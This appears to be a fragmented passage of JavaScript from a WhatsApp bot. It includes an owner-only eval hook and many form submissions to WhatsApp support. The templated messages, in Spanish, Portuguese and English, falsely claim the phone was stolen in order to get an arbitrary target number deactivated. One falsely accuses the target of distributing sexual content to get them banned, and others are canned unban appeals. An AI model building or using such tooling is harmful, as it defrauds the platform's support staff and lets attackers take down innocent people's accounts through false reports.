...
var xeonytimewisher = `Good Morning 🌄`
		...
		if (isEval && senderNumber == "+1435845556") {
			let evaled,
				text = q,
...
break
case 'verifymenu': {
var unicorn = await getBuffer(picak+'Verify Menu')
sendXeonBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${verifymenu(prefix)}`,
mentions:[sender],
contextInfo:{
...
form.append("your_message", `Hola equipo de soporte de WhatsApp. Quiero desactivar mi propio número ${text}, porque me han robado el teléfono y el número. Por favor, ayúdame inmediatamente a desactivar mi número de whatsapp ${text} para que mi número no sea utilizado por alguien que ha robado mi teléfono`)
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola soporte de whatsapp. Quiero denunciar una violación del número de Whatsapp ${text} Encontré un delito en Whatsapp que contiene acoso sexual y difunde videos sexuales en el grupo, y los administradores del grupo cometen actos delictivos como vender productos para adultos como fotos de desnudos, fotos sexys, videos sexys y otros. Porque es un acto que daña whatsapp, viola las leyes y reglamentos, así como las reglas de whatsapp. Pido al soporte de WhatsApp que tome medidas inmediatas, como bloquear permanentemente el número del perpetrador por cometer un acto delictivo que lo viole. Número de WhatsApp del actor: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdi/roubei meu celular, meu cartão SIM foi bloqueado, mas o ladrão continua usando meu número de WhatsApp para coisas indesejadas, desative meu número: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Meu celular foi roubado, o cartão SIM do meu celular foi bloqueado, mas o ladrão ainda usa meu número do WhatsApp no celular para coisas indesejadas por favor desative meu número: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Meu celular foi perdido/roubado, o SIM foi bloqueado, por favor desative meu número: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola Estimado WhatsApp. Buenos días/tardes/noches. Les pido su ayuda para que mi whatsapp ${text} pueda ser utilizado nuevamente. Realmente necesito este número de whatsapp para la escuela y mis datos personales están en whatsapp para el estudio y la escuela. Les ruego que desbaneen mi número de inmediato`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola Estimado WhatsApp. Buenos días/tardes/noches. Soy el dueño de la empresa axio que produce laptops, computadoras y otros. También tengo acciones en mi empresa. Y ahora mi número de WhatsApp ${text} ha sido bloqueado por alguien. Y hacer acusaciones falsas contra los números. Entonces no puedo verificar mi número de WhatsApp. Le ruego a Whatsapp que me ayude de inmediato para que mi número de WhatsApp pueda ser usado nuevamente, realmente lo necesito y todavía quiero usar ese número Gracias`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `To the developers of Whatsapp, suddenly my whatsapp account was banned and I don't know the reason, please reactivate my whatsapp account: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `hello WhatsApp, I'm explaining the problem to my friend via the WhatsApp application and I have been blocked or forcibly deactivated due to spam my number: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `My WhatsApp has been deactivated or blocked spam by you even though I was only discussing my work: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hello support, my WhatsApp has been affected by the forced deactivation of spam because I was accused of sending inappropriate messages: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Por favor, pesquise o código OTP para este número porque outra pessoa acidentalmente se conectou com o meu número e eu tive que esperar 8 horas, por favor, pesquise novamente neste número: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hello WhatsApp I sent a message to my friend and have never committed a violation but I have been permanently blocked or disabled by you for no reason my number: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hello Whatsapp my number has been permanently blocked suddenly and I did nothing wrong: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
...
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `hello WhatsApp support, my number has been deactivated by an irresponsible person through your service: ${text}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
